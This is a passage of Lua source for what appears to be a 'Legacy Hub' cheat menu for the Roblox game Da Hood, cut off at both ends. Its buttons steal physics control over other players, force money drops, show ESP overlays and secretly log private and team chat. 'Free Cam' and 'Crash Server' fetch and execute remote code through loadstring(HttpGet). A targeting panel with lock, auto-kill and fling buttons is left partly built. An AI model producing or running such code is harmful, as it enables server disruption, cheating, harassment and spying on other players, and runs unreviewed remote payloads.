		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(.1)
		spawn(function()
			while true do game:GetService("RunService").Heartbeat:wait()
				for i,v in pairs(game.Players:GetPlayers()) do
					if v == game.Players.LocalPlayer == false then
						game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
						game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
						v.MaximumSimulationRadius = 0
						v.SimulationRadius = 0
						game:GetService("RunService").Stepped:wait()
					end
				end
			end
		end)

		local Player = game:GetService("Players").LocalPlayer
		local Players = game:GetService("Players")
		local HatList = {}
		local i = 0
		for _,l in pairs(Player.Character:GetChildren()) do
			if l:IsA("Accessory") then if i>0 then l.Parent = workspace  end i = i + 1 end;
		end
		wait(.1)



		for _,v in pairs(workspace:GetDescendants()) do
			if v.Name == "Handle" and v:IsA("BasePart") and v.Parent:IsA("Accessory") and v:IsDescendantOf(Player.Character)==false and Players:GetPlayerFromCharacter(v.Parent.Parent)==nil then
				table.insert(HatList,v)
				v.CanCollide = false
			end
		end

		for _,hat in pairs(HatList) do
			hat.Parent = workspace
			hat.Position = Player.Character.HumanoidRootPart.Position + Player.Character.HumanoidRootPart.CFrame.lookVector * 5
			local BodyPos = Instance.new("BodyPosition",hat)
			local BodyAng = Instance.new("BodyAngularVelocity",hat)
			BodyAng.AngularVelocity = Vector3.new(0,9e12,0)
			BodyAng.P = 9e12
			BodyPos.MaxForce = Vector3.new(9e9,9e9,9e9)
			BodyPos.P = 9e8
			spawn(function()
				while wait() do
					if pcall(function()
							hat.CanCollide = false

							BodyPos.Position = Player.Character.HumanoidRootPart.Position + Vector3.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
						end) then
					else
						BodyPos:Destroy()
						hat.CanCollide = false
					end
				end
			end)
		end
	end);
	local AutoReload = ExtrasChannel:Button('Auto Reload', function()
		game:GetService('RunService').Heartbeat:Connect(function()
			for _, v in pairs(game:GetService('Players').LocalPlayer.Character:GetChildren()) do 
				if v:FindFirstChild('Ammo') and v:FindFirstChild('Ammo').Value == 0 then
					game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('Reload', v)
				end;
			end;
		end);
	end);
	local NoRecoil = ExtrasChannel:Button('No Recoil', function()
		for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
			if v:IsA('Camera') then
				v:Destroy()
			end
		end
		game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid;

		local newcam = Instance.new('Camera',game.Workspace)
		newcam.Name = 'Camera'
		newcam.CameraType = 'Custom'
		newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild('Humanoid')
		newcam.HeadLocked = true
		newcam.HeadScale = 1
	end);
	local DickBat = ExtrasChannel:Button('Dick Bat', function()
		local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
		local k = game.Workspace.Ignored.Shop["[Bat] - $250"]
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
		if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
			wait(.2)
			fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
			toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[Bat]")
			toolf.Parent = game.Players.LocalPlayer.Character;
			wait()
			game.Players.LocalPlayer.Character:WaitForChild("[Bat]")
			game.Players.LocalPlayer.Character:WaitForChild("[Bat]").Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
			game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripForward = Vector3.new(0, -1, -0)
			game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripPos = Vector3.new(1.2111, 1.11114, 1.8111)
			game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripUp = Vector3.new(-500000, 404, 5000000)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end
	end);
	local DickLMG = ExtrasChannel:Button('Dick LMG', function()
		local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
		local k = game.Workspace.Ignored.Shop["[LMG] - $3750"]
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
		if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
			wait(.2)
			fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
			toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[LMG]")
			toolf.Parent = game.Players.LocalPlayer.Character;
			wait()
			game.Players.LocalPlayer.Character:WaitForChild("[LMG]")
			game.Players.LocalPlayer.Character:WaitForChild("[LMG]").Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
			game.Players.LocalPlayer.Character:WaitForChild("[LMG]").GripForward = Vector3.new(0, -1, -0)
			game.Players.LocalPlayer.Character:WaitForChild("[LMG]").GripPos = Vector3.new(1.2111, 1.11114, 1.8111)
			game.Players.LocalPlayer.Character:WaitForChild("[LMG]").GripUp = Vector3.new(-500000, 404, 5000000)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end
	end);
	local Male = ExtrasChannel:Button('Male', function()
		local lol3 = game.Workspace.Ignored.Shop["[Bat] - $275"]
		local lol2 = game.Workspace.Ignored.Shop["[StopSign] - $300"]
		local lol = game.Workspace.Ignored.Shop["[Hamburger] - $5"]
		game.Players.LocalPlayer.Character:MoveTo(lol.Head.Position)
		wait(0.20)
		fireclickdetector(lol.ClickDetector,4)
		wait(1)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
		wait(0.20)
		game.Players.LocalPlayer.Character:MoveTo(lol.Head.Position)
		fireclickdetector(lol.ClickDetector,4)
		wait(1)
		game.Players.LocalPlayer.Character:MoveTo(lol2.Head.Position)
		wait(0.20)
		fireclickdetector(lol2.ClickDetector,4)
		wait(1)
		game.Players.LocalPlayer.Character:MoveTo(lol3.Head.Position)
		wait(0.20)
		fireclickdetector(lol3.ClickDetector,4)
		if lol and lol2 and lol3 then
			wait(3)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1.5, -2, -1)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1.5, -1, -1)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[StopSign]"].GripPos     = Vector3.new(0, -1.5, 2 )
			game.Players.LocalPlayer.Backpack["[StopSign]"].GripForward     = Vector3.new(-3, -3, -1)
			game.Players.LocalPlayer.Backpack["[StopSign]"].GripRight     = Vector3.new(-0, -5, 1)
			game.Players.LocalPlayer.Backpack["[StopSign]"].GripUp     = Vector3.new(2, 0, 75)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos     = Vector3.new(2, -5, -1.5)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward     = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight     = Vector3.new(1, 0, -3)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp     = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Backpack["[StopSign]"].Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
		end
	end);
	local Female = ExtrasChannel:Button('Female', function()
		local lol = game.Workspace.Ignored.Shop["[Hamburger] - $5"]
		game.Players.LocalPlayer.Character:MoveTo(lol.Head.Position)
		wait(0.25)
		fireclickdetector(lol.ClickDetector,4)
		wait(0.20)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1, 1.5, 0.3)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 90)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
		wait(0.25)
		fireclickdetector(lol.ClickDetector,4)
		wait(0.25)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(2, 1.5, 0.3)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 90)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1, 1.5, 0.3)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 90)
		game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
	end);
	local ForceDrop = ExtrasChannel:Button('Force Drop', function()
		game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('DropMoney', 10000);
	end);
	local Mask = ExtrasChannel:Button('Mask', function()
		local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
		local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
		if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
			wait(.2)
			fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
			toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
			toolf.Parent = game.Players.LocalPlayer.Character;
			wait()
			game.Players.LocalPlayer.Character:WaitForChild("Mask")
			game:GetService("VirtualUser"):ClickButton1(Vector2.new())
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end
	end);
	local InvisiMask = ExtrasChannel:Button('Invisible Mask', function()
		local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
		local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
		if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
			wait(.2)
			fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
			toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
			toolf.Parent = game.Players.LocalPlayer.Character;
			wait()
			game.Players.LocalPlayer.Character:WaitForChild("Mask")
			game:GetService("VirtualUser"):ClickButton1(Vector2.new())
			game.Players.LocalPlayer.Character:WaitForChild("In-gameMask")
			game.Players.LocalPlayer.Character["In-gameMask"].Handle:Destroy()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end
	end);
	local AntiEquipment = ExtrasChannel:Button('Anti Equipment', function()
		game:GetService('RunService').Heartbeat:Connect(function()
			for _, v in pairs(game:GetService('Players').LocalPlayer.Character:GetChildren()) do
				if v:IsA('Tool') then
					v.Parent = game:GetService('Players').LocalPlayer:FindFirstChild('Backpack');
				end;
			end;
		end);
	end);
	local ForceReset = ExtrasChannel:Button('Force Reset', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):Destroy();
	end);
	local FreeKorblox = ExtrasChannel:Button('Free Korblox', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('RightUpperLeg'):Destroy()
	end);
	local Amogus = ExtrasChannel:Button('Amogus', function()
		pcall(function()
			game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
			game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
			game.Players.LocalPlayer.Character.Head.Neck:Destroy()
			game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
			game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Character.Head.Massless = true
			game.Players.LocalPlayer.Character.Head.CanCollide = false

			while true do 
				pcall(function()  
					game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
					game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
					game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
				end)
				wait()
			end
		end)
	end);
	local JailedTools = ExtrasChannel:Button('Tools While Jailed', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'):FindFirstChild('Cuff'):Destroy();
	end);
	local EquipAll = ExtrasChannel:Button('Equip All', function()
		for _, v in next, game:GetService('Players').LocalPlayer.Backpack:GetChildren() do
			if v:IsA('Tool') then
				v.Parent = game:GetService('Players').LocalPlayer.Character
			end;
		end;
	end);
	local MaskNames = ExtrasChannel:Button('Mask Names', function()
		for _, v in pairs(game:GetService('Players'):GetPlayers()) do
			if v and v.Character and v.Character:FindFirstChildOfClass('Humanoid') and v.Character:FindFirstChildOfClass('Humanoid').DisplayDistanceType ~= Enum.HumanoidDisplayDistanceType.Viewer then
				v.Character:FindFirstChildOfClass('Humanoid').DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer;
			end;
		end;
	end);
	local FreeCam = ExtrasChannel:Button('Free Cam', function()
		local notifSound = Instance.new("Sound",workspace)
		notifSound.PlaybackSpeed = 1.5
		notifSound.Volume = 0.15
		notifSound.SoundId = "rbxassetid://170765130"
		notifSound.PlayOnRemove = true
		notifSound:Destroy()
		game.StarterGui:SetCore("SendNotification", {Title = "Legacy Hub", Text = "Press B to toggle freecam", Icon = "rbxassetid://505845268", Duration = 15, Button1 = "Okay"})
		loadstring(game:HttpGet('http://bin.shortbin.eu:8080/raw/y19YLDQKjP'))();
	end);
	local Invisible = ExtrasChannel:Button('Invisible', function()
		OldInvisCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(318.499, 93.825, -919.513)
		wait(0.1)
		game.Players.LocalPlayer.Character:BreakJoints()
		wait(0.1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldInvisCFrame
	end);
	local Spin = ExtrasChannel:Button('Spin', function()
		local HumanoidRootPart = game:GetService('Players').Character:FindFirstChild('HumanoidRootPart');
		game:GetService('RunService').Heartbeat:Connect(function()
			HumanoidRootPart.CFrame = game:GetService('Players').Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.Angles(0, math.rad(50), 0);
		end);
	end);
	local ESP = ExtrasChannel:Button('ESP', function()
		game:GetService('RunService').Heartbeat:Connect(function()
			for _, v in pairs(game:GetService('Players'):GetPlayers()) do
				if v.Character then
					if not v.Character:FindFirstChild('UpperTorso'):FindFirstChild('ESP') then
						local ESP = Instance.new('BillboardGui', v.Character:FindFirstChild('UpperTorso'));
						ESP.StudsOffset = Vector3.new(0,3,0);
						ESP.Size = UDim2.new(4,0,1,0);
						ESP.AlwaysOnTop = true;
						ESP.Name = 'ESP';
						local TextLabel = Instance.new('TextLabel', ESP);
						TextLabel.Text = (v.Name ..' | ' .. v.DisplayName);
						TextLabel.BackgroundTransparency = 1;
						TextLabel.Size = UDim2.new(1, 0, 1, 0);
						TextLabel.TextColor3 = Color3.new(0, 255, 0);
					end;
				end;
			end;
		end);
	end);
	local Stamina = ExtrasChannel:Button('Stamina', function()
		while game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Jump == true do
			wait();
			game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Humanoid').JumpPower = 50;
			game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Jump = true;
		end;
	end);
	local Chatlogs = ExtrasChannel:Button('Chatlogs', function()
		enabled = true
		spyOnMyself = false
		public = false
		publicItalics = true
		privateProperties = {
			Color = Color3.fromRGB(0, 255, 255);
			Font = Enum.Font.SourceSansBold;
			TextSize = 18;
		}
		local StarterGui = game:GetService("StarterGui")
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
		local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
		local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
		local instance = (_G.chatSpyInstance or 0) + 1
		_G.chatSpyInstance = instance

		local function onChatted(p, msg)
			if _G.chatSpyInstance == instance then
				if p == player and msg:lower():sub(1, 4) == "/spy" then
					enabled = not enabled
					wait(0.3)
					privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
					StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
				elseif enabled and (spyOnMyself == true or p ~= player) then
					msg = msg:gsub("[\n\r]", ''):gsub("\t", ' '):gsub("[ ]+", ' ')
					local hidden = true
					local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
						if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(#msg - #packet.Message + 1) and (channel == "All" or (channel == "Team" and public == false and Players[packet.FromSpeaker].Team == player.Team)) then
							hidden = false
						end
					end)
					wait(1)
					conn:Disconnect()
					if hidden and enabled then
						if public then
							saymsg:FireServer((publicItalics and "/me " or '').."{SPY} ["..p.Name.."]: "..msg, "All")
						else
							privateProperties.Text = "{SPY} ["..p.Name.."]: "..msg
							StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
						end
					end
				end
			end
		end

		for _, p in ipairs(Players:GetPlayers()) do
			p.Chatted:Connect(function(msg)
				onChatted(p, msg)
			end)
		end
		Players.PlayerAdded:Connect(function(p)
			p.Chatted:Connect(function(msg)
				onChatted(p, msg)
			end)
		end)
		privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
		StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
		if not player.PlayerGui:FindFirstChild("Chat") then
			wait(3)
		end
		local chatFrame = player.PlayerGui.Chat.Frame
		chatFrame.ChatChannelParentFrame.Visible = true
		chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y)
	end);
	local CrashServer = ExtrasChannel:Button('Crash Server', function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Crash/main/YesEpic", true))()
	end);

	-- /* Startup */
	game:GetService('StarterGui'):SetCore('SendNotification', {Title = 'Legacy Hub', Text = 'We have started! Thank you for using our service.', Duration = 15});

	-- /* Security */
	function Security()
		local BindableFunction = Instance.new('BindableFunction');
		function BindableFunction.OnInvoke(v)
			if v == 'Accept' then
				local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
				local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
				if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
					wait(.2)
					fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
					toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
					toolf.Parent = game.Players.LocalPlayer.Character;
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("Mask")
					game:GetService("VirtualUser"):ClickButton1(Vector2.new())
					game.Players.LocalPlayer.Character:WaitForChild("In-gameMask")
					game.Players.LocalPlayer.Character["In-gameMask"].Handle:Destroy()
					if game.Players.LocalPlayer.Character:FindFirstChild("Shirt") then
						game.Players.LocalPlayer.Character.Shirt:Destroy()
					elseif game.Players.LocalPlayer.Character:FindFirstChild("Pants") then
						game.Players.LocalPlayer.Character.Pants:Destroy()
					end
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
				end
			else
				game:GetService('StarterGui'):SetCore('SendNotification', {
					Title = 'Legacy Hub';
					Text = 'If you get banned, its not on us!';
					Duration = 6.9;
				});
			end;
		end;
		game:GetService('StarterGui'):SetCore("SendNotification", {
			Title = 'Legacy Hub';
			Text = 'Morph yourself, wont affect your game. Prevents global bans.';
			Duration = 3.4028235e+38;
			Callback = BindableFunction;
			Button1 = 'Accept';
			Button2 = 'Decline';
		});
	end;
	Security();
	
	-- /* Target */
	-- /* Target */
	function Target()
		local bind = Instance.new("BindableFunction");

		function bind.OnInvoke(v)
			if v == 'Accept' then
				--/ Important checks 'n waiting for stuff to load or smthing

				repeat
					wait()
				until game:GetService("Players").LocalPlayer ~= nil

				if not game:GetService("Players").LocalPlayer.Character then
					game:GetService("Players").LocalPlayer.CharacterAdded:Wait()
				end



				--/ Variables & Da Hood Gui Clones Deletion

				local LocalPlayer = game:GetService("Players").LocalPlayer
				local Character = LocalPlayer.Character
				local Workspace = game:GetService("Workspace")
				local CoreGui = game:GetService("CoreGui")

				local LockedPlayer = nil

				for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
					if v.Name == "DaHoodGui" then
						v:Destroy()
					end
				end



				-- clone detecting
				for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
					if v.Name == "ScreenGui" then
						v:Destroy()
					end
				end


				-- Gui to Lua
				-- Version: 3.2

				-- Instances:

				local ScreenGui = Instance.new("ScreenGui")
				local lmao = Instance.new("Frame")
				local Target = Instance.new("ScrollingFrame")
				local TextBox = Instance.new("TextBox")
				local UIListLayout = Instance.new("UIListLayout")
				local Lock = Instance.new("TextButton")
				local Unlock = Instance.new("TextButton")
				local RPGLock = Instance.new("TextButton")
				local RPGUnlock = Instance.new("TextButton")
				local AutokillOn = Instance.new("TextButton")
				local AutoKillOff = Instance.new("TextButton")
				local View = Instance.new("TextButton")
				local Unview = Instance.new("TextButton")
				local Teleport = Instance.new("TextButton")
				local Bag = Instance.new("TextButton")
				local Info = Instance.new("TextButton")
				local Fling = Instance.new("TextButton")
				local TextLabel = Instance.new("TextLabel")
				local TextButton = Instance.new("TextButton")
				--// Shrink Name
				TextBox.FocusLost:connect(function()
					for i,v in pairs(game.Players:GetChildren()) do
						if (string.sub(string.lower(v.Name),1,string.len(TextBox.Text))) == string.lower(TextBox.Text) then
							TextBox.Text = v.Name
						end
					end
				end)
				function findPlayer(name)
					name = name:lower()
					if name == 'me' then
						return game:GetService('Players').LocalPlayer;
					end;
					for i, v in pairs(Players:GetPlayers()) do
						if v.Name:lower():find(name) == 1 then
							return v;
						else
							if v.Character:FindFirstChildOfClass('Humanoid').DisplayName:lower():find(name) == 1 then
								return v;
							end;
						end;
					end;
				end;

				--/ Functions

				local function GetShortenedPlrFromName(name) -- uses string.sub to see if the typed in name fits and matches somewhere in the player's name, uncase sensitive. returns a table where the player is inside because of the all and others support
					name = string.lower(tostring(name))

					if not game:GetService("Players"):FindFirstChild("all") and name == "all" or game:GetService("Players"):FindFirstChild("all") and game:GetService("Players"):FindFirstChild("all").ClassName ~= "Player" and name == "all" then
						return game:GetService("Players"):GetPlayers()
					end
					if not game:GetService("Players"):FindFirstChild("others") and name == "others" or game:GetService("Players"):FindFirstChild("others") and game:GetService("Players"):FindFirstChild("others").ClassName ~= "Player" and name == "others" then
						name = game:GetService("Players"):GetPlayers()
						for i, v in pairs(name) do
							if v == LocalPlayer then
								table.remove(name, i)
							end
						end
						return name
					end

					for i, v in pairs(game.Players:GetPlayers()) do
						if string.lower(string.sub(v.Name, 1, #name)) == name then
							return {v}
						end
					end

					return nil
				end

				-- // Functions

				function findPlayer(name)
					name = name:lower()
					if name == 'me' then
						return game:GetService'Players'.LocalPlayer
					end
					for i,v in pairs(game:GetService'Players':GetPlayers()) do
						if v.Name:lower():find(name) == 1 then
							return v
						end
					end
				end
				---noob
				local LockedPlayer = nil
				for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do

					if v.Name == "ScreenGui" then
						v:Destroy()
					end
				end

				function GetPlayer(String)
					local plr
					local strl = String:lower()
					for i, v in pairs(game:GetService("Players"):GetPlayers()) do
						if v.Name:lower():sub(1, #String) == String:lower() then
							plr = v
						end 
					end
					if String == "me" then
						plr = game.Players.LocalPlayer
					end
					if String == "" or String == " " then
						plr = nil
					end
					return plr
				end

				function comma(s)
					local i, v = tostring(s);
					while true do
						local j, l = string.gsub(i, '^(-?%d+)(%d%d%d)', '%1,%2');
						i = j;
						if l == 0 then
							break;
						end;
					end;
					return i;
				end

				local LocalPlayer = game:GetService("Players").LocalPlayer
				local Character = LocalPlayer.Character
				local Workspace = game:GetService("Workspace")
				local CoreGui = game:GetService("CoreGui")

				local locked = nil



				--Properties:

				ScreenGui.Parent = game.CoreGui
				ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

				lmao.Name = "lmao"
				lmao.Parent = ScreenGui
				lmao.AnchorPoint = Vector2.new(0.5, 0.5)
				lmao.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
				lmao.BorderColor3 = Color3.fromRGB(35, 35, 35)
				lmao.BorderSizePixel = 6
				lmao.Position = UDim2.new(0.5, 0, 0.5, 0)
				lmao.Size = UDim2.new(0, 190, 0, 291)
				lmao.Active = true
				lmao.Draggable = true

				Target.Name = "Target"
				Target.Parent = lmao
				Target.Active = true
				Target.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
				Target.BorderColor3 = Color3.fromRGB(26, 26, 26)
				Target.Position = UDim2.new(-0.00305240019, 0, 0.133945003, 0)
				Target.Size = UDim2.new(0, 190, 0, 252)
				Target.ScrollBarThickness = 5

				TextBox.Parent = Target
				TextBox.BackgroundColor3 = Color3.fromRGB(112, 112, 112)
				TextBox.BorderColor3 = Color3.fromRGB(112, 112, 112)
				TextBox.Size = UDim2.new(0, 183, 0, 27)
				TextBox.Font = Enum.Font.SourceSans
				TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
				TextBox.PlaceholderText = "Name"
				TextBox.Text = ""
				TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextBox.TextSize = 20.000

				UIListLayout.Parent = Target
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout.Padding = UDim.new(0, 3)
				--/ Functions

				function GetShortenedPlrFromName(name) -- uses string.sub to see if the typed in name fits and matches somewhere in the player's name, uncase sensitive. returns a table where the player is inside because of the all and others support
					name = string.lower(tostring(name))

					if not game:GetService("Players"):FindFirstChild("all") and name == "all" or game:GetService("Players"):FindFirstChild("all") and game:GetService("Players"):FindFirstChild("all").ClassName ~= "Player" and name == "all" then
						return game:GetService("Players"):GetPlayers()
					end
					if not game:GetService("Players"):FindFirstChild("others") and name == "others" or game:GetService("Players"):FindFirstChild("others") and game:GetService("Players"):FindFirstChild("others").ClassName ~= "Player" and name == "others" then
						name = game:GetService("Players"):GetPlayers()
						for i, v in pairs(name) do
							if v == LocalPlayer then
								table.remove(name, i)
							end
						end
						return name
					end

					for i, v in pairs(game.Players:GetPlayers()) do
						if string.lower(string.sub(v.Name, 1, #name)) == name then
							return {v}
						end
					end

					return nil
				end

				Lock.Name = "Lock"
				Lock.Parent = Target
				Lock.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				Lock.BorderColor3 = Color3.fromRGB(35, 35, 35)
				Lock.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				Lock.Size = UDim2.new(0, 183, 0, 36)
				Lock.Font = Enum.Font.GothamSemibold
				Lock.Text = "Lock"
